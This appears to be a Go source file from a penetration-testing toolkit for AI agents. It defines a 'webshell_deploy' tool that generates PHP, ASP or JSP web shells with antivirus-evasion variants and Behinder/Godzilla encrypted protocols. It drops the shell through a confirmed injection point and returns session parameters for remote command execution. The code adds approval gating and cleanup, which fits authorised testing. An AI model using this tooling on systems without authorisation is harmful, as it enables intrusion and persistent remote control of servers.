package shell

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/c1ayooo/4zrec/internal/capkit/core"
	"github.com/c1ayooo/4zrec/internal/capkit/kits/postex/shell/payload"
	"github.com/c1ayooo/4zrec/internal/capkit/kits/postex/shell/protocol"
)

// webshell_deploy is the bridge the ROADMAP calls for between "a confirmed
// command-injection point" and "a session I can drive with session_exec":
// exploitkit proves execution, this tool turns it into a foothold.
//
// The split follows shellkit's existing host boundaries: payload.Generate
// renders the bytes (a pure function, already covered by its own tests), and a
// host-supplied WebShellDeployer performs the write. capkit ships no default
// uploader, so the same tool serves an injectable PHP endpoint, an ASP.NET
// upload handler or a JSP file-write sink without pretending to know any of
// them.
//
// Whatever landed on the target's disk comes back as a cleanup command: a
// foothold that cannot be removed is not a testing tool, it is a persistence
// primitive left behind by accident.

// WebShellDeployer is the host boundary for actually placing a shell on the
// target. The host owns the transport — typically the same gate-aware HTTPDoer
// it used for the probe that confirmed execution — and must apply its own
// scope/approval/evidence policy on top of the runtime's.
type WebShellDeployer interface {
	Drop(ctx context.Context, req WebShellDrop) (*WebShellDropResult, error)
}

// WebShellDrop is what the host is handed: the rendered payload plus where it
// should go. Content is the exact bytes to write; the host decides how.
type WebShellDrop struct {
	TargetURL string
	Method    string
	Dir       string
	Filename  string
	Content   []byte
	SHA256    string
	ShellType string
	CmdParam  string
	PassParam string
	// Password is the connection secret baked into the payload. The host needs
	// it to register the session; it must not be logged or stored in evidence.
	Password string
	Variant  string
	Protocol string
}

// WebShellDropResult is what the host reports back. FileURL is the URL that
// serves the dropped shell, and the tool turns it into a session_open spec.
type WebShellDropResult struct {
	FileURL string
	// Cleanup is the command that removes the file (e.g. `rm -f /var/www/x.php`).
	Cleanup string
	// CleanupURL, when set, is an URL that removes the file when requested.
	CleanupURL string
}

// webshellDeploySpec declares the tool. Risk is high: it writes executable
// content to a target, so the runtime's approval gate is mandatory.
func webshellDeploySpec() core.ToolSpec {
	return core.ToolSpec{
		Name:        "webshell_deploy",
		Description: "把生成的 WebShell 载荷投递到目标，并返回可直接用于 session_open(kind=webshell) 的参数。适用已确认命令执行或文件写入的漏洞点（如 cmdi_probe/cmdi_execute 命中的注入点）。出参含落点 URL、session 参数与删除落盘件的清理命令——投递产物必须可清理。",
		Risk:        core.RiskHigh,
		RateLimit:   core.RateLimitSpec{PerSecond: 2, Burst: 2, Concurrency: 1},
		InputSchema: json.RawMessage(`{
  "type":"object",
  "properties":{
    "target":{"type":"string","description":"承载投递的页面或接口 URL（注入点 URL 或上传接口）"},
    "method":{"type":"string","enum":["POST","PUT"],"description":"投递方法，默认 POST"},
    "shell_type":{"type":"string","enum":["php","asp","aspx","jsp"]},
    "variant":{"type":"string","enum":["plain","lite","enc"],"description":"免杀变体，默认 plain"},
    "protocol":{"type":"string","enum":["plain","behinder","godzilla"],"description":"流量协议，默认 plain；加密协议仅 PHP"},
    "dir":{"type":"string","description":"目标落盘目录"},
    "filename":{"type":"string","description":"落盘文件名，缺省随机低噪音"},
    "password":{"type":"string","description":"连接口令；缺省随机生成，只出现在返回的 session 参数里"},
    "cmd_param":{"type":"string","description":"命令参数名，默认 cmd"},
    "watermark":{"type":"string","description":"投递溯源标记（如 delivery ID），写进载荷注释便于识别与清理"}
  },
  "required":["target","shell_type"]
}`),
		OutputSchema: json.RawMessage(`{
  "type":"object",
  "properties":{
    "file_url":{"type":"string"},
    "sha256":{"type":"string"},
    "filename":{"type":"string"},
    "shell_type":{"type":"string"},
    "template_id":{"type":"string"},
    "variant":{"type":"string"},
    "protocol":{"type":"string"},
    "webshell":{"type":"object","description":"可直接喂给 session_open(kind=webshell) 的参数"},
    "cleanup":{"type":"object","description":"删除落盘件的命令与方式"}
  }
}`),
		ExtractTargets: func(input json.RawMessage) ([]core.Target, error) {
			var in struct {
				Target string `json:"target"`
			}
			if err := json.Unmarshal(input, &in); err != nil {
				return nil, err
			}
			if strings.TrimSpace(in.Target) == "" {
				return nil, fmt.Errorf("target 必填")
			}
			t, err := core.TargetFromURL(0, strings.TrimSpace(in.Target))
			if err != nil {
				return nil, err
			}
			return []core.Target{t}, nil
		},
	}
}

type deployInput struct {
	Target    string `json:"target"`
	Method    string `json:"method"`
	ShellType string `json:"shell_type"`
	Variant   string `json:"variant"`
	Protocol  string `json:"protocol"`
	Dir       string `json:"dir"`
	Filename  string `json:"filename"`
	Password  string `json:"password"`
	CmdParam  string `json:"cmd_param"`
	Watermark string `json:"watermark"`
}

func (c *Capability) deploy(ctx context.Context, call core.Call) (core.Result, error) {
	if c.deployer == nil {
		return core.FailResult(core.ToolMissing(
			"WebShellDeployer 未注入（宿主需提供 shell.WebShellDeployer）")), nil
	}
	var in deployInput
	if err := json.Unmarshal(call.Input, &in); err != nil {
		return core.FailResult(core.InvalidInput(err.Error())), nil
	}
	if strings.TrimSpace(in.Target) == "" {
		return core.FailResult(core.InvalidInput("target 必填")), nil
	}
	shellType, err := payload.NormalizeShellType(in.ShellType)
	if err != nil {
		return core.FailResult(core.InvalidInput(err.Error())), nil
	}
	variant, err := payload.NormalizeVariant(in.Variant)
	if err != nil {
		return core.FailResult(core.InvalidInput(err.Error())), nil
	}
	proto, err := protocol.NormalizeProtocol(in.Protocol)
	if err != nil {
		return core.FailResult(core.InvalidInput(err.Error())), nil
	}

	gen, err := payload.Generate(payload.Options{
		ShellType: shellType,
		Password:  strings.TrimSpace(in.Password),
		Watermark: strings.TrimSpace(in.Watermark),
		CmdParam:  strings.TrimSpace(in.CmdParam),
		Variant:   variant,
		Protocol:  string(proto),
	})
	if err != nil {
		return core.FailResult(core.InvalidInput("载荷生成失败：" + err.Error())), nil
	}
	filename := strings.TrimSpace(in.Filename)
	if filename == "" {
		filename = gen.Filename
	}
	method := deployMethod(in.Method)

	res, err := c.deployer.Drop(ctx, WebShellDrop{
		TargetURL: strings.TrimSpace(in.Target),
		Method:    method,
		Dir:       strings.TrimSpace(in.Dir),
		Filename:  filename,
		Content:   gen.Content,
		SHA256:    gen.SHA256,
		ShellType: string(gen.ShellType),
		CmdParam:  gen.CmdParam,
		PassParam: protocol.DefaultPassParam,
		Password:  gen.Password,
		Variant:   string(gen.Variant),
		Protocol:  gen.Protocol,
	})
	if err != nil {
		return core.FailResult(core.UpstreamError("投递失败：" + err.Error())), nil
	}
	if res == nil || strings.TrimSpace(res.FileURL) == "" {
		return core.FailResult(core.UpstreamError("投递未返回落点 URL")), nil
	}

	// session_open's parameters, ready to paste: the URL to hit, the secret that
	// is the password, and the options the WebShell opener reads. Building them
	// here makes the next step one call instead of a guess about option names.
	sessionSpec := map[string]any{
		"kind":   "webshell",
		"host":   strings.TrimSpace(res.FileURL),
		"secret": gen.Password,
		"options": map[string]string{
			"shell_type": string(gen.ShellType),
			"cmd_param":  gen.CmdParam,
			"pass_param": protocol.DefaultPassParam,
			"protocol":   gen.Protocol,
			"method":     method,
		},
	}
	cleanup := map[string]any{
		"command": strings.TrimSpace(res.Cleanup),
		"url":     strings.TrimSpace(res.CleanupURL),
	}
	if strings.TrimSpace(res.Cleanup) == "" && strings.TrimSpace(res.CleanupURL) == "" {
		cleanup["missing"] = "宿主未给出清理方式；落盘件在目标上会留存，需人工按 file_url 删除"
	}

	out, _ := core.DataResult(map[string]any{
		"file_url":    strings.TrimSpace(res.FileURL),
		"sha256":      gen.SHA256,
		"filename":    filename,
		"shell_type":  string(gen.ShellType),
		"template_id": gen.TemplateID,
		"variant":     string(gen.Variant),
		"protocol":    gen.Protocol,
		"webshell":    sessionSpec,
		"cleanup":     cleanup,
	})
	out.Summary = core.ClampSummary(fmt.Sprintf(
		"已在 %s 落地 %s shell（模板 %s，sha256 %s…），可用 session_open(kind=webshell) 接管",
		strings.TrimSpace(res.FileURL), gen.ShellType, gen.TemplateID, shortHash(gen.SHA256)))
	out.Meta.Target = strings.TrimSpace(in.Target)
	out.Next = []core.NextStep{
		{
			Tool:          "session_open",
			Reason:        "按返回的 webshell 参数接管刚落地的会话",
			Risk:          core.RiskHigh,
			Preconditions: []string{"webshell.file_url"},
			Params:        mustJSON(sessionSpec),
		},
		{
			Tool:          "session_exec",
			Reason:        "会话打开后执行 id 确认回显",
			Risk:          core.RiskHigh,
			Preconditions: []string{"session.session_id"},
		},
	}
	return out, nil
}

func deployMethod(m string) string {
	if strings.EqualFold(strings.TrimSpace(m), "PUT") {
		return "PUT"
	}
	return "POST"
}

func shortHash(h string) string {
	if len(h) <= 12 {
		return h
	}
	return h[:12]
}

func mustJSON(v any) json.RawMessage {
	b, err := json.Marshal(v)
	if err != nil {
		return nil
	}
	return b
}
